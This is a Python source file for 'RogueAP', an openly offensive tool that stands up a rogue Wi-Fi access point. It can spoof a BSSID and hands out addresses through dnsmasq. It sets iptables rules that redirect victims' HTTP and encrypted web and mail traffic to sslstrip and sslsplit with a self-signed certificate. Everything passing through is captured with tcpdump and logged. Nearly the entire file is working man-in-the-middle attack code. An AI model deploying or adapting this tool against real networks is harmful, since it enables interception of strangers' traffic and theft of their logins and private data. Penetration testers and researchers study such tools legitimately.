#!/usr/bin/env python
"""
    Start a rogue access point with no effort, with support for hostapd, airbase, sslstrip, sslsplit, tcpdump builtin
    Copyright (C) 2015  Bram Staps (Glasswall B.V.)

    This file is part of RogueAP.
    RogueAP is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    ArpSpoof is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
"""
import argparse
import tempfile
import subprocess
import multiprocessing
import os
import signal
import sys
import time
import shutil

###########################################################################################

#do not run with a spoofed mac (hostapd wont work)
#do not run a network manager

def die(message):
    sys.stderr.write("%s\n" % message)
    exit(1)

def check_sslstrip():
    try:
        return not subprocess.call(["sslstrip", "--help"], stdout=null, stderr=null)
    except:
        return False

def check_sslsplit():
    try:
        return not subprocess.call(["sslsplit", "-h"], stdout=null, stderr=null)
    except:
        return False

def check_openssl():
    try:
        return not subprocess.call(["openssl", "-h"], stdout=null, stderr=null)
    except:
        return False

def check_airbase():
    try:
        return subprocess.call(["airbase-ng", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def check_hostapd():
    try:
        return subprocess.call(["hostapd", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def check_dnsmasq():
    try:
        return not subprocess.call(["dnsmasq", "--help"], stdout=null, stderr=null)
    except:
        return False 

def check_tcpdump():
    try:
        return subprocess.call(["tcpdump", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def check_mergecap():
    try:
        return subprocess.call(["mergecap", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def check_iptables():
    try:
        return not subprocess.call(["iptables", "--help"], stdout=null, stderr=null)
    except:
        return False

def check_ip():
    try:
        return not subprocess.call(["ip", "link", "show"], stdout=null, stderr=null)
    except:
        return False

def check_iw():
    try:
        return not subprocess.call(["iw", "list"], stdout=null, stderr=null)
    except:
        return False

def check_iptables_nat():
    try:
        return not subprocess.call(["iptables", "-t", "nat", "-L"], stdout=null, stderr=null)
    except:
        return False


def poll_iface_exists(iface):
    return not subprocess.call(["ip", "link", "show", iface], stdout=null, stderr=null)


def gen_ssl_key(bits=2048): #returns file with ssl key
    n, path = tempfile.mkstemp()
    os.close(n)
    subprocess.call(["openssl", "genrsa", "-out", path, str(bits)], stdout=null, stderr=null)
    return path

def gen_ssl_cert(ssl_key_file, days=365, C="US", ST="California", LC="Toontown", O="ACME", OU="Experimental Explosives", CN="Will E. Coyote", email="" ): #returns file with ssl cert
    n, path = tempfile.mkstemp()
    os.close(n)

    #openssl req -new -x509 -days 1826 -key ca.key -out ca.crt

    popen = subprocess.Popen(["openssl", "req", "-new", "-x509", "-days", str(days), "-key", ssl_key_file, "-out", path], stdin=subprocess.PIPE, stdout=null, stderr=null)
    popen.communicate("%s\n%s\n%s\n%s\n%s\n%s\n%s\n" % (C, ST, LC, O, OU, CN, email))
    return path


null = open("/dev/null", "w")
#check iptables for nat table

###########################################################################################

### MAIN

parser = argparse.ArgumentParser()
parser.add_argument("wlan_interface", help="The Interface in monitor mode interface", type=str)
parser.add_argument("inet_interface", help="The Interface in monitor mode interface", type=str)
parser.add_argument("--ssid", help="Use this ssid for network (default = using airbase)", type=str)
parser.add_argument("--channel", help="Use this channel (default: current channel)", type=int)
parser.add_argument("--sslstrip", help="Use sslstrip", action="store_true")
parser.add_argument("--sslsplit", help="Use sslsplit", action="store_true")
parser.add_argument("--logdir", help="Directory Where to log this session", type=str, default=".")
parser.add_argument("--bssid", help="Bssid to spoof running this ap", type=str, default=None)
args = parser.parse_args()

### Run plreliminary checks

if os.geteuid(): die("You need to be root")

if not check_ip(): die("ip command absent or broken") 

if not check_iw(): die("iw command absent of broken")

if not check_tcpdump(): die("tcpdump command absent or broken") 

if not check_mergecap(): die("mergecap command absent or broken")

if not check_iptables(): die("iptables absent or broken")

if not check_iptables_nat(): die("iptables does not have natting functionality")

if not check_dnsmasq(): die("dnsmasq command absent or broken")

if args.ssid:
    if not check_hostapd(): die("hostapd command absent or broken")
else:
    if not check_airbase(): die("airbase-ng command absent or broken")    
    
if args.sslstrip: 
    if not check_sslstrip(): die("sslstrip command absent or broken")

if args.sslsplit: 
    if not check_sslsplit(): die("sslsplit command absent or broken")
    if not check_openssl(): die("openssl command absent or broken")

if not poll_iface_exists(args.wlan_interface): die("%s is not a valid interface" % args.wlan_interface)
if not poll_iface_exists(args.inet_interface): die("%s is not a valid interface" % args.eth_interface)
   



## read settings form stdin:
print "Read settings from stdin, send EOF to continue"
settings = {"ip": "10.55.66.1", "netmask": "255.255.255.0", "dhcp-start": "10.55.66.100", "dhcp-stop": "10.55.66.200", "dhcp-lease": "5m", "dhcp-gateway": "10.55.66.1", "dhcp-dns": "10.55.66.1", "additional-hosts-file": "/dev/null", "ssl-key": None, "ssl-cert": None}

for line in sys.stdin:
    try: #if line fails try the next one
        key, value = line.split("=" , 1)
        key = key.strip()
        value = value.strip()
        settings[key] = value
    except:
        pass

print "Starting Rogue AP"
print ""
print "Running with the following settings:"
for key, value in settings.iteritems():
    print "%s = %s" % (key, value)

print ""





### init
if args.channel:
    subprocess.call(["iw", "dev", args.wlan_interface, "set", "channel", str(args.channel)] ,stdout=null, stderr=null)

log_path = tempfile.mkdtemp()
log_path_pcap = os.path.join(log_path, "pcap") 
os.mkdir(log_path_pcap)

if args.sslstrip: #using sslstrip
    log_path_sslstrip = os.path.join(log_path, "sslstrip")
    os.mkdir(log_path_sslstrip)

if args.sslsplit: #using sslsplit
    log_path_sslsplit = os.path.join(log_path, "sslsplit")
    os.mkdir(log_path_sslsplit)

    ssl_key = settings["ssl-key"]
    ssl_cert = settings["ssl-cert"]

    if not ssl_key: ssl_key = gen_ssl_key()
    if not ssl_cert: ssl_cert = gen_ssl_cert(ssl_key)

    if not os.path.isfile(ssl_key): die("ssl key file '%s' not found" % ssl_key)
    if not os.path.isfile(ssl_cert): die("ssl certificate file '%s' not found" % ssl_cert)


iface = "" #the interface which will contain the therne traffic of the ap
if args.ssid: #hostapd for AP
    iface = args.wlan_interface
else: #airbase for APd
    iface = "at0"
    

with open("/proc/sys/net/ipv4/ip_forward", "r") as f: ip_forward = f.read().strip()
with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1")
subprocess.call(["iptables", "-I", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"] ,stdout=null, stderr=null)
subprocess.call(["iptables", "-I", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"] ,stdout=null, stderr=null)
subprocess.call(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"] ,stdout=null, stderr=null)

if args.sslsplit:
    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-ports", "8443"] ,stdout=null, stderr=null)    
    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--dport", "587", "-j", "REDIRECT", "--to-ports", "8443"] ,stdout=null, stderr=null)    
    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--dport", "465", "-j", "REDIRECT", "--to-ports", "8443"] ,stdout=null, stderr=null)    
    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--dport", "993", "-j", "REDIRECT", "--to-ports", "8443"] ,stdout=null, stderr=null)    

if args.sslstrip:
    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"] ,stdout=null, stderr=null)


if args.ssid: #using hostapd
    n, hostapd_path = tempfile.mkstemp()
    f = os.fdopen(n, "w")
    f.write("interface=%s\n" % iface)
    f.write("driver=nl80211\n")
    f.write("ssid=%s\n" % args.ssid)
    if not args.channel:
        print "warning, --channel setting not found, while it is needed for hostapd; defaulting to 6"
        args.channel = 6
    f.write("channel=%s\n" % int(args.channel))
    if args.bssid:
        f.write("bssid=%s\n" % args.bssid)
    f.close()

n, dnsmasq_path = tempfile.mkstemp()
f = os.fdopen(n, "w")
f.write("interface=%s\n" % iface)
f.write("dhcp-range=%s,%s,%s\n" % (settings["dhcp-start"], settings["dhcp-stop"], settings["dhcp-lease"]))
f.write("dhcp-option=3,%s\n" % settings["dhcp-gateway"])
f.write("dhcp-option=6,%s\n" % settings["dhcp-dns"])
f.write("no-hosts\n")
f.write("addn-hosts=%s\n" % settings["additional-hosts-file"])
f.close()


def nukeall(popen_list):
    for popen in popen_list:
        if popen.poll() == None:
            popen.kill()

    del popen_list[:]





### run and restore loop
try:
    pids = []
    deathloop_count = -1
    while True:
        deathloop_count += 1

        print "********** (RE)INIT #%d *************" % deathloop_count

        if args.ssid: #hostapd for AP #######################################
            p = subprocess.Popen( ["hostapd", hostapd_path] )
            pids.append(p)
        else: #airbase for AP ###############################################
            if args.bssid:
                p = subprocess.Popen( ["airbase-ng", "-a", args.bssid, args.wlan_interface] )
            else:
                p = subprocess.Popen( ["airbase-ng", args.wlan_interface] )
            pids.append(p)
        #for both ###########################################################
        print "waiting for interface '%s' to emerge" % iface
        while not poll_iface_exists(iface):
            time.sleep(0.01)

        subprocess.call(["ifconfig", iface, settings["ip"], "netmask", settings["netmask"], "up"])

        p = subprocess.Popen( ["tcpdump", "-i", iface, "-w", os.path.join(log_path_pcap, str(deathloop_count))] )
        pids.append(p)

        if args.sslstrip:
            p = subprocess.Popen( ["sslstrip", "-a", "-f", "-w", os.path.join(log_path_sslstrip, str(deathloop_count))], stderr=null ) #sslstrip's library is kinda buggy
            pids.append(p)

        if args.sslsplit:
            p = subprocess.Popen( ["sslsplit", "-S", log_path_sslsplit, "-k", ssl_key, "-c", ssl_cert, "ssl", "0.0.0.0", "8443"], stderr=null )

        p = subprocess.Popen( ["dnsmasq", "-d", "-C", dnsmasq_path] )
        pids.append(p)

        while True: #this loop guards all programs that should, and kills / reboots the whole sequence if needed
            break_time = False

            for pid in pids:
                if pid.poll() != None:
                    break_time = True
                    break
            if break_time: break
            time.sleep(0.01)

        print "program in chain failed, restarting chain..."
        print ""
        nukeall(pids)

except KeyboardInterrupt:
    pass
    




### deinit
print "Stopping Rogue AP"
nukeall(pids)

with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write(ip_forward)

subprocess.call(["iptables", "-D", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"] ,stdout=null, stderr=null)
subprocess.call(["iptables", "-D", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"] ,stdout=null, stderr=null)
subprocess.call(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=null, stderr=null)

if args.sslsplit: #using sslsplit:
    #remove key and / or cert if we generated them
    if not settings["ssl-key"]: os.remove(ssl_key)
    if not settings["ssl-cert"]: os.remove(ssl_cert)
    
    subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-ports", "8443"] ,stdout=null, stderr=null)    
    subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "587", "-j", "REDIRECT", "--to-ports", "8443"] ,stdout=null, stderr=null)    
    subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "465", "-j", "REDIRECT", "--to-ports", "8443"] ,stdout=null, stderr=null)    
    subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "993", "-j", "REDIRECT", "--to-ports", "8443"] ,stdout=null, stderr=null)    

if args.sslstrip: #using sslstrip
    subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"] ,stdout=null, stderr=null)

if args.ssid: #using hostapd
    subprocess.call(["ip", "addr", "flush", args.wlan_interface] ,stdout=null, stderr=null)
    subprocess.call(["ip", "link", "set", args.wlan_interface, "down"] ,stdout=null, stderr=null)
    subprocess.call(["iw", "dev", args.wlan_interface, "set", "type", "monitor"] ,stdout=null, stderr=null)
    subprocess.call(["ip", "link", "set", args.wlan_interface, "up"] ,stdout=null, stderr=null)

##collate all logs and plaace them

#pcap
pcap_logfiles = []
for x in range(deathloop_count+1):
    f = os.path.join(log_path_pcap, str(x))
    if os.path.isfile(f):
        pcap_logfiles.append(f)

dest_log = os.path.join(args.logdir, "sniff.pcap")
subprocess.call(["mergecap", "-w", dest_log] + pcap_logfiles, stdout=null, stderr=null)
os.chmod(dest_log, 0664)


if args.sslstrip: #using sslstrip
    dest_log = os.path.join(args.logdir, "sslstrip.log")
    with open(dest_log, "ab") as f: 
        for x in range(deathloop_count+1):
            logfile = os.path.join(log_path_sslstrip, str(x))
            if os.path.isfile(logfile):
                with open( logfile, "r" ) as r:
                    f.write("\n%s" % r.read())

if args.sslsplit: #using sslsplit
    for filename in os.listdir(log_path_sslsplit):
        src = os.path.join(log_path_sslsplit, filename)
        dst = os.path.join(args.logdir, filename)
        shutil.copyfile(src,dst)
        os.chmod( dst, 0664 )
        

#remove log dit and dns masq settings file
shutil.rmtree(log_path)
os.remove(dnsmasq_path)

if args.ssid: #hostapd
    os.remove(hostapd_path)
